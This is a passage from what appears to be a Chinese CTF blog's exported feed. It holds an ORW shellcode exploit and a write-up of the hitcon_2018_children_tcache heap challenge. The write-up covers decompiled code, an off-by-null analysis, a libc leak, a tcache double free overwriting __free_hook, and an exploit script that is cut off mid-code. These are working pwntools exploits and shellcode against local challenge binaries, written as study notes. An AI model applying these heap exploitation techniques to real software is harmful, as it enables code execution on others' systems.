class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">p = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = shellcraft.sh()</span></span><br><span class="line"><span class="comment">#payload = cyclic(0x108)+asm(shellcode)</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">jmp_rsp = <span class="number">0x00000000004011de</span></span><br><span class="line">payload = asm(shellcode).ljust(<span class="number">0x108</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(ret) + p64(jmp_rsp)</span><br><span class="line">payload += asm(<span class="string">&#x27;sub rsp, 0x118&#x27;</span>)</span><br><span class="line">payload += asm(<span class="string">&#x27;jmp rsp&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>效果：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113221927501.bmp"></p><h2 id="手写汇编"><a href="#手写汇编" class="headerlink" title="手写汇编"></a>手写汇编</h2><ul><li>先介绍一下三个函数的系统调用（64位情况下)</li></ul><blockquote><p><code>open</code> 系统调用用于打开一个文件，并返回文件描述符。</p><p><strong>系统调用号</strong>: 2</p><p><strong>寄存器传递参数</strong>:</p><ul><li><strong><code>rax</code></strong> &#x3D; 2（<code>open</code> 的系统调用号）</li><li><strong><code>rdi</code></strong> &#x3D; 文件路径（<code>const char *pathname</code>）</li><li><strong><code>rsi</code></strong> &#x3D; 标志（<code>int flags</code>，例如 <code>O_RDONLY</code>、<code>O_WRONLY</code>、<code>O_RDWR</code> 等）</li><li><strong><code>rdx</code></strong> &#x3D; 模式（<code>mode_t mode</code>，用于 <code>O_CREAT</code> 标志时指定文件权限）</li></ul></blockquote><blockquote><p><code>read</code> 系统调用用于从文件描述符读取数据。</p><p><strong>系统调用号</strong>: 0</p><p><strong>寄存器传递参数</strong>:</p><ul><li><strong><code>rax</code></strong> &#x3D; 0（<code>read</code> 的系统调用号）</li><li><strong><code>rdi</code></strong> &#x3D; 文件描述符（<code>int fd</code>）</li><li><strong><code>rsi</code></strong> &#x3D; 缓冲区（<code>void *buf</code>）</li><li><strong><code>rdx</code></strong> &#x3D; 要读取的字节数（<code>size_t count</code>）</li></ul></blockquote><blockquote><p><code>write</code> 系统调用用于向文件描述符写入数据。</p><p><strong>系统调用号</strong>: 1</p><p><strong>寄存器传递参数</strong>:</p><ul><li><strong><code>rax</code></strong> &#x3D; 1（<code>write</code> 的系统调用号）</li><li><strong><code>rdi</code></strong> &#x3D; 文件描述符（<code>int fd</code>）</li><li><strong><code>rsi</code></strong> &#x3D; 缓冲区（<code>const void *buf</code>）</li><li><strong><code>rdx</code></strong> &#x3D; 要写入的字节数（<code>size_t count</code>）</li></ul></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">/* open(&#x27;flag&#x27;) */</span><br><span class="line">push 0x67616c66;</span><br><span class="line">mov rdi, rsp;  // 注意不要pop, 不然后面不能直接mov rsi, rsp;</span><br><span class="line">xor rsi, rsi;</span><br><span class="line">xor rdx, rdx;</span><br><span class="line">push 2;</span><br><span class="line">pop rax;</span><br><span class="line">syscall;</span><br><span class="line"></span><br><span class="line">/* read(3,&#x27;rsp&#x27;,0x30) */</span><br><span class="line">push 3; pop rdi;</span><br><span class="line">push 0x30; pop rdx;</span><br><span class="line">mov rsi, rsp;</span><br><span class="line">xor rax, rax;</span><br><span class="line">syscall;</span><br><span class="line"></span><br><span class="line">/* write(1,&#x27;rsp&#x27;,0x30) */</span><br><span class="line">push 1; pop rdi;</span><br><span class="line">mov rsi, rsp;</span><br><span class="line">push 0x30; pop rdx;</span><br><span class="line">push 1; pop rax;</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> seccomp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcon_2018_children_tcache</title>
      <link href="/2024/11/09/hitcon-2018-children-tcache/"/>
      <url>/2024/11/09/hitcon-2018-children-tcache/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>off_by_null``Glibc2.27``Double Free</code></p><p>第一次遇到<code>off_by_null</code>,关键函数是<code>strcpy</code></p><p><mark>该题目要有较强的分析能力，时刻明白chunk被分配给谁了！！！！<mark></mark></mark></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-2034h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-2030h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-2028h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8216</span>]; <span class="comment">// [rsp+20h] [rbp-2020h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+2038h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x2010</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123; <span class="comment">// 从0开始循环+1，有空闲的就用</span></span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !heaplist[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = input();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  dest = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  my_read(s, size);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, s);                              <span class="comment">// off_by_null</span></span><br><span class="line">  heaplist[i] = dest;</span><br><span class="line">  sizelist[i] = size;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_E4B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v2 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  v0 = *(&amp;heaplist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(*(&amp;heaplist + v2));</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><ul><li>将<code>user data</code>全部覆盖为<code>0xDA</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heaplist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(heaplist[v1], <span class="number">0xDA</span>, sizelist[v1]);</span><br><span class="line">    <span class="built_in">free</span>(heaplist[v1]);</span><br><span class="line">    heaplist[v1] = <span class="number">0LL</span>;</span><br><span class="line">    sizelist[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul><li><code>strcpy</code>有off_by_null,它会在复制完之后的字符串加上<code>\x00</code>，假设我们<code>malloc(0x68)</code>并且将0x68填充完，那么多余的<code>\x00</code>就会覆盖到下一个chunk的size</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *start = dest;            <span class="comment">// 保存起始位置，方便返回</span></span><br><span class="line">    <span class="keyword">while</span> ((*dest++ = *src++) != <span class="string">&#x27;\0&#x27;</span>);  <span class="comment">// 逐字符复制直到遇到 `\0`</span></span><br><span class="line">    <span class="keyword">return</span> start;                  <span class="comment">// 返回目标字符串的指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>在<code>add</code>函数内部有着一层循环，只要<code>heaplist[i]=0</code>就会拿来接收malloc的指针</li><li>这里的free将会填充user_data为0xda，普通的<code>unsorted bin arrack</code>无法使用，但是我们可以利用<code>off_by_null</code>去修改</li><li>于是我们可以先malloc两个chunk，第一个malloc(0x420)为了之后free进入<code>unsorted bin</code>，然后第二个malloc(0xn8)，通过add的漏洞和<code>off_by_null</code>我们可以持续的修改chunk1(从0开始计数)的下一个chunk的<code>prev_size</code>，然后可以使得free chunk合并，然后就是简单的<code>double free</code></li></ul><h1 id="gdb详解"><a href="#gdb详解" class="headerlink" title="gdb详解"></a>gdb详解</h1><h2 id="改prev-size-0"><a href="#改prev-size-0" class="headerlink" title="改prev_size&#x3D;0"></a>改prev_size&#x3D;0</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x420</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;2&#x27;</span>) <span class="comment"># 必须是0x4f0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>): <span class="comment"># 单字节修改prev_size</span></span><br><span class="line">    add(<span class="number">0x68</span>-i,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x68</span>-i))</span><br><span class="line">    free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><ul><li>在for循环中，我们每次malloc的其实都是tcache中的chunk，也就是<code>chunk1</code>,但是程序是将它给了heaplist[0]，所以free[0]只会将heaplist[0]也就是chunk0的user_data覆盖为0xDA,而不影响chunk1</li><li><font color="red">解释一下for循环中的</font></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i=<span class="number">0</span>时，填充<span class="number">0x68</span>，溢出\x00填充chunk2的size末字节，即size=<span class="number">0x500</span></span><br><span class="line">i=<span class="number">1</span>时，填充<span class="number">0x67</span>，修改prev_size末字节为\x00,相当于b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x67</span>+b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure></div><ul><li>效果：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109162313762.bmp" alt="for循环之前"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109162346023.bmp" alt="for循环之后"></p><h2 id="合并free-chunk-leak-libc"><a href="#合并free-chunk-leak-libc" class="headerlink" title="合并free chunk+leak_libc"></a>合并free chunk+leak_libc</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,cyclic(<span class="number">0x60</span>)+p64(<span class="number">0x4a0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x420</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x10</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x60</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br></pre></td></tr></table></figure></div><ul><li>再次add还是修改chunk1，此时是为了修改prev_size，导致free(2)的时候free chunk合并，下面add(0x420)分理出chunk1,然后show(0)就会得到<code>main_arena附近的值</code>，但是<code>unsorted bin</code>的fd和bk不应该是在free状态下才有的吗？🤨我们查看此时堆结构：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109163923308.bmp"></p><ul><li>此时的chunk0确实没有fd和bk，而出chunk1具有fd和bk指针，show(1)的话就获得，但为什么是show(0)呢？</li><li>仔细分析一下,问题还是出现在add函数里面😢：</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">该部分开头的add是将chunk1对应的指针给到heaolist[0]</span><br><span class="line">---&gt; heaplist[0] = chunk1</span><br><span class="line">接着free(2),heaplist[2]=0</span><br><span class="line">再次的add(0x420)，由于heaplist[0]!=0,所以此时是将分割的chunk给到heaplist[1]</span><br><span class="line">---&gt; heaplist[1] == 分割的chunk(chunk0)</span><br><span class="line">show(0),即show(heaplist[0]-&gt;chunk1)</span><br><span class="line">将chunk1的user_data部分输出出来</span><br></pre></td></tr></table></figure></div><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">one = [<span class="number">0x4f2be</span>,<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">onegadget = libc.address + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,cyclic(<span class="number">0x67</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>由于该版本的Glibc2.27没有<code>double free</code>的检查，直接改就行</li><li>对两个free解释，接着上面的说：</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">此时add，是将分割出的chun1给到heaplist[2]</span><br><span class="line">---&gt; heaplist[2] = chunk1</span><br><span class="line">free(0) 相当于 free(heaplist[0]-&gt;chunk1)</span><br><span class="line">free(2) 相当于 free(heaplist[2]-&gt;chunk1)</span><br><span class="line">造成了double free</span><br></pre></td></tr></table></figure></div><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot; # ubuntu16</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.27.so&quot; # ubuntu18</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26742)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache 有off_ny_one漏洞，可申请10个chunk</span></span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span 